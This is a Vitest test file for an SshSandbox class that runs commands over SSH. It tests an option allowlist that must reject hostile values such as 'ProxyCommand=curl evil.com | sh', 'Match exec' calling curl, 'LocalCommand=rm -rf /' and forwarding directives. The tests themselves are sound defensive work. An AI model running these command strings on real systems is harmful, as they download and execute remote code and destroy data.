import { describe, it, expect, vi, beforeEach } from 'vitest'
import { SshSandbox } from '../ssh.js'
import { streamProcess } from '../stream-process.js'

vi.mock('../stream-process.js', () => ({
  streamProcess: vi.fn(async function* () {
    yield {
      type: 'executionResult',
      exitCode: 0,
      stdout: '',
      stderr: '',
      outputFiles: [],
    }
  }),
}))

describe('SshSandbox', () => {
  beforeEach(() => {
    vi.mocked(streamProcess).mockClear()
  })

  describe('constructor', () => {
    it('stores host and workingDir', () => {
      const sandbox = new SshSandbox({ host: 'myhost', workingDir: '/workspace' })
      expect(sandbox.host).toBe('myhost')
      expect(sandbox.workingDir).toBe('/workspace')
    })
  })

  describe('SSH option allowlist', () => {
    it('permits known-safe options', () => {
      expect(
        () =>
          new SshSandbox({
            host: 'h',
            workingDir: '/w',
            sshOptions: ['ConnectTimeout=10', 'ServerAliveInterval=60', 'Compression=yes'],
          })
      ).not.toThrow()
    })

    it('rejects ProxyCommand', () => {
      expect(
        () =>
          new SshSandbox({
            host: 'h',
            workingDir: '/w',
            sshOptions: ['ProxyCommand=curl evil.com | sh'],
          })
      ).toThrow(/ProxyCommand.*not allowed/)
    })

    it('rejects Include', () => {
      expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: ['Include=/tmp/evil.conf'] })).toThrow(
        /Include.*not allowed/
      )
    })

    it('rejects Match', () => {
      expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: ['Match exec "curl evil.com"'] })).toThrow(
        /Match.*not allowed/
      )
    })

    it('rejects LocalCommand', () => {
      expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: ['LocalCommand=rm -rf /'] })).toThrow(
        /LocalCommand.*not allowed/
      )
    })

    it('rejects forwarding directives', () => {
      for (const opt of ['LocalForward=8080:localhost:80', 'RemoteForward=9090:internal:80', 'DynamicForward=1080']) {
        expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: [opt] })).toThrow(/not allowed/)
      }
    })

    it('is case-insensitive', () => {
      expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: ['proxycommand=evil'] })).toThrow(
        /not allowed/
      )
      expect(() => new SshSandbox({ host: 'h', workingDir: '/w', sshOptions: ['PROXYCOMMAND=evil'] })).toThrow(
        /not allowed/
      )
    })

    it('allowUnsafeSshOptions=true bypasses validation', () => {
      expect(
        () =>
          new SshSandbox({
            host: 'h',
            workingDir: '/w',
            sshOptions: ['ProxyCommand=anything'],
            allowUnsafeSshOptions: true,
          })
      ).not.toThrow()
    })
  })

  describe('executeStreaming SSH argument construction', () => {
    it('builds correct SSH args with defaults', async () => {
      const sandbox = new SshSandbox({ host: 'user@server.com', workingDir: '/remote/path' })

      for await (const _ of sandbox.executeStreaming('echo hi')) {
        // consume
      }

      expect(streamProcess).toHaveBeenCalledWith(
        'ssh',
        [
          '-o',
          'StrictHostKeyChecking=accept-new',
          '-o',
          'BatchMode=yes',
          '-p',
          '22',
          '--',
          'user@server.com',
          "cd '/remote/path' && echo hi",
        ],
        { timeout: undefined, signal: undefined, enoentMessage: 'ssh is not installed or not on PATH' }
      )
    })

    it('uses StrictHostKeyChecking=no when allowUnknownHosts is true', async () => {
      const sandbox = new SshSandbox({ host: 'h', workingDir: '/w', allowUnknownHosts: true })

      for await (const _ of sandbox.executeStreaming('ls')) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      expect(args).toContain('StrictHostKeyChecking=no')
      expect(args).not.toContain('StrictHostKeyChecking=accept-new')
    })

    it('includes identity file when provided', async () => {
      const sandbox = new SshSandbox({
        host: 'h',
        workingDir: '/w',
        identityFile: '/home/user/.ssh/key',
      })

      for await (const _ of sandbox.executeStreaming('ls')) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      const idx = args.indexOf('-i')
      expect(idx).toBeGreaterThan(-1)
      expect(args[idx + 1]).toBe('/home/user/.ssh/key')
    })

    it('uses custom port', async () => {
      const sandbox = new SshSandbox({ host: 'h', workingDir: '/w', port: 2222 })

      for await (const _ of sandbox.executeStreaming('ls')) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      const idx = args.indexOf('-p')
      expect(idx).toBeGreaterThan(-1)
      expect(args[idx + 1]).toBe('2222')
    })

    it('appends user sshOptions as -o flags', async () => {
      const sandbox = new SshSandbox({
        host: 'h',
        workingDir: '/w',
        sshOptions: ['ConnectTimeout=5', 'ServerAliveInterval=30'],
      })

      for await (const _ of sandbox.executeStreaming('ls')) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      expect(args).toEqual(expect.arrayContaining(['-o', 'ConnectTimeout=5', '-o', 'ServerAliveInterval=30']))
    })

    it('quotes cwd with single quotes', async () => {
      const sandbox = new SshSandbox({ host: 'h', workingDir: "/path/with spaces/and'quotes" })

      for await (const _ of sandbox.executeStreaming('ls')) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      expect(args[args.length - 1]).toContain("cd '/path/with spaces/and'\\''quotes'")
    })

    it('uses cwd option when provided', async () => {
      const sandbox = new SshSandbox({ host: 'h', workingDir: '/default' })

      for await (const _ of sandbox.executeStreaming('ls', { cwd: '/override' })) {
        // consume
      }

      const args = vi.mocked(streamProcess).mock.calls[0]![1]
      expect(args[args.length - 1]).toContain("cd '/override'")
    })

    it('forwards timeout and signal to streamProcess', async () => {
      const sandbox = new SshSandbox({ host: 'h', workingDir: '/w' })
      const controller = new AbortController()

      for await (const _ of sandbox.executeStreaming('ls', { timeout: 5, signal: controller.signal })) {
        // consume
      }

      const opts = vi.mocked(streamProcess).mock.calls[0]![2]
      expect(opts).toStrictEqual({
        timeout: 5,
        signal: controller.signal,
        enoentMessage: 'ssh is not installed or not on PATH',
      })
    })
  })
})
